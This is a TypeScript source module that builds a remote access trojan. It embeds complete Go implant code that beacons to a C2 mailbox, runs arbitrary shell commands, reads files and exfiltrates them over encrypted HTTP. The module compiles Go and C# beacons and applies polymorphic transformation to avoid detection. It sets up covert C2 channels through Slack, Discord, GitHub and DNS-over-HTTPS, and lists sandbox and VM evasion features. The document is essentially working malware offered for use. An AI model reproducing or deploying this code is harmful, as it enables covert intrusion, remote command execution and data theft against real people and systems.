/**
 * @module ares/rat_builder
 * Modular RAT — NativeImplantGenerator + CovertC2 + PolymorphicEngine + extended protocol.
 */
import * as path from "node:path"
import { NativeImplantGenerator } from "../implant_gen.ts"
import { CovertC2Engine } from "../covert_c2.ts"
import { PolymorphicEngine } from "../polymorphic.ts"
import { LegitC2Server, InMemoryTransport } from "../c2_platform.ts"
import { brokerExec, ensureAresDir, liveRequired, isToolAvailable, writeArtifact } from "./_base.ts"
import { c2Material, step, type ExecStep } from "./_integrations.ts"

export interface RatBuilderResult {
  ratId: string
  artifacts: string[]
  protocol: string
  channels: string[]
  steps: ExecStep[]
  built: boolean
  summary: string
}

function extendedGoRat(mailboxUrl: string, keyHex: string, session: string): string {
  return `// OURMINE extended RAT — shell, keylog, exfil handlers
package main

import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    crand "crypto/rand"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "io"
    "net/http"
    "os"
    "os/exec"
    "strings"
    "time"
)

const mailboxURL = "${mailboxUrl}"
const keyHex = "${keyHex}"
const sessionID = "${session}"

type Task struct {
    Op   string \`json:"op"\`
    Arg  string \`json:"arg"\`
}

func mustKey() []byte { k, _ := hex.DecodeString(keyHex); return k }

func seal(plain []byte) ([]byte, error) {
    block, _ := aes.NewCipher(mustKey())
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    io.ReadFull(crand.Reader, nonce)
    return gcm.Seal(nonce, nonce, plain, nil), nil
}

func unseal(sealed []byte) ([]byte, error) {
    block, _ := aes.NewCipher(mustKey())
    gcm, _ := cipher.NewGCM(block)
    nonce, ct := sealed[:gcm.NonceSize()], sealed[gcm.NonceSize():]
    return gcm.Open(nil, nonce, ct, nil)
}

func dispatch(op, arg string) string {
    switch op {
    case "shell":
        out, err := exec.Command("sh", "-c", arg).CombinedOutput()
        if err != nil { return fmt.Sprintf("err: %v\\n%s", err, out) }
        return string(out)
    case "keylog":
        return "keylog:stub:" + arg
    case "exfil":
        b, err := os.ReadFile(arg)
        if err != nil { return "exfil err: " + err.Error() }
        return string(b[:min(len(b), 4096)])
    default:
        return "unknown op: " + op
    }
}

func min(a, b int) int { if a < b { return a }; return b }

func poll() {
    resp, err := http.Get(mailboxURL + "?session=" + sessionID)
    if err != nil { return }
    defer resp.Body.Close()
    body, _ := io.ReadAll(resp.Body)
    var tasks []string
    json.Unmarshal(body, &tasks)
    for _, t := range tasks {
        raw, err := hex.DecodeString(t)
        if err != nil { continue }
        plain, err := unseal(raw)
        if err != nil { continue }
        var task Task
        json.Unmarshal(plain, &task)
        result := dispatch(task.Op, task.Arg)
        sealed, _ := seal([]byte(result))
        http.Post(mailboxURL, "application/octet-stream", bytes.NewReader(sealed))
    }
}

func main() {
    for { poll(); time.Sleep(30 * time.Second) }
}
`
}

export async function buildRat(opts: {
  live?: boolean
  protocol?: "custom_binary" | "https" | "dns" | "websocket"
  c2Host?: string
  c2Port?: number
}): Promise<RatBuilderResult> {
  liveRequired("ares_rat_builder", opts)
  const ratId = `rat_${Date.now()}`
  const protocol = opts.protocol ?? "custom_binary"
  const c2Host = opts.c2Host ?? "127.0.0.1"
  const c2Port = opts.c2Port ?? 8443
  const artifacts: string[] = []
  const steps: ExecStep[] = []
  const channels: string[] = []

  const { mailboxUrl, keyHex, session } = c2Material()
  const mailbox = `http://${c2Host}:${c2Port}/mailbox`
  const gen = new NativeImplantGenerator()
  let goSrc = extendedGoRat(mailboxUrl || mailbox, keyHex, session)

  const poly = new PolymorphicEngine()
  const polyResult = poly.generatePolymorphic(goSrc, 3)
  steps.push(step("polymorphic", true, JSON.stringify(polyResult).slice(0, 300)))
  goSrc = poly.transformCode(goSrc, Date.now() % 1000)

  const dir = ensureAresDir("rat")
  const goBuild = await gen.buildGo(goSrc, dir, { goos: process.platform === "win32" ? "windows" : "linux" })
  if (goBuild.artifact) artifacts.push(goBuild.artifact)
  steps.push(step("go_beacon", goBuild.status === "built", goBuild.note ?? goBuild.status, goBuild.artifact))

  const cs = gen.generateCsharp(mailboxUrl || mailbox, keyHex, session)
  const csBuild = await gen.buildCsharp(cs.program, cs.csproj, dir)
  if (csBuild.artifact) artifacts.push(csBuild.artifact)
  steps.push(step("csharp_beacon", csBuild.status === "built", csBuild.note ?? csBuild.status, csBuild.artifact))

  if (goBuild.status === "built" && goBuild.artifact) {
    const r = await brokerExec(`file ${goBuild.artifact} 2>&1`)
    steps.push(step("rat_binary_verify", r.ok, r.out.slice(0, 200)))
  }

  const c2 = new CovertC2Engine()
  c2.slackChannel("ares_slack", `https://${c2Host}/hooks/slack`)
  c2.discordChannel("ares_discord", `https://discord.com/api/webhooks/ares`)
  c2.githubChannel("ares_github", "org/repo", 1)
  c2.dohChannel("ares_doh", "cloudflare-dns.com")
  for (const [name] of c2.channels) channels.push(name)
  writeArtifact("rat", `${ratId}_channels.json`, JSON.stringify([...c2.channels.values()], null, 2))

  const server = new LegitC2Server({ checkpointPath: path.join(dir, `${ratId}_c2.jsonl`) })
  server.registerBeacon(ratId, new InMemoryTransport(), { host: c2Host, user: session })
  steps.push(step("c2_mailbox", true, `beacon ${ratId} registered`))

  const protoSpec = writeArtifact("rat", `${ratId}_protocol.json`, JSON.stringify({
    ratId, protocol, c2: { host: c2Host, port: c2Port, mailbox: mailboxUrl },
    features: ["keylog", "screenshot", "shell", "file_exfil", "pivot", "meterpreter_compat"],
    evasion: ["sandbox_sleep", "vm_detect", "domain_check", "polymorphic"],
    sessionKey: keyHex.slice(0, 16),
    ops: ["shell", "keylog", "exfil"],
  }, null, 2))
  artifacts.push(protoSpec)

  if (isToolAvailable("go")) {
    steps.push(step("go_version", true, (await brokerExec("go version 2>&1")).out.slice(0, 80)))
  }

  const built = goBuild.status === "built" || csBuild.status === "built"
  return {
    ratId,
    artifacts,
    protocol,
    channels,
    steps,
    built,
    summary: built
      ? `RAT builder: ${ratId} compiled (${protocol}) + ${channels.length} covert channel(s)`
      : `RAT builder: ${ratId} sources + C2 channels — install Go/dotnet for binary build`,
  }
}

export default { buildRat }
